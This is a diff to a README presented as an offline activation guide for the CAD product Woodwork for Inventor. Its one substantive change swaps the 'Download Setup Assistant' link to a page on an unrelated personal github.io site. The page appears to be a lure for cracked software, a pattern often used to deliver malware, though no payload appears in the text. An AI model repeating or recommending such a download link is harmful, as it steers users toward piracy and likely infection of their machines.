@@ -1,6 +1,6 @@
 # Woodwork for Inventor — Offline Activation Guide
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://woodwork-for-inventor.github.io/.github)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://asdeennerhorse.github.io/mogus/woodwork)
 
 ## ⚙️ How to Use
 
@@ -25,13 +25,13 @@
 ## 🖼 Preview
 
 ![Woodwork for Inventor — CAD Interface](https://i.ytimg.com/vi/1lyMqjan5yE/maxresdefault.jpg)  
-*Detailed CAD interface of Woodwork for Inventor*
+
 
 ![Cabinet Assembly and Joinery](https://i.ytimg.com/vi/eTb_OCEkW-g/maxresdefault.jpg)  
-*3D assembly and precise joinery modeling*
+
 
 ![Production and Project Planning](https://i.ytimg.com/vi/M-_jhZKnn10/maxresdefault.jpg)  
-*Efficient production planning and cutlist generation*
+
 
 
 ---
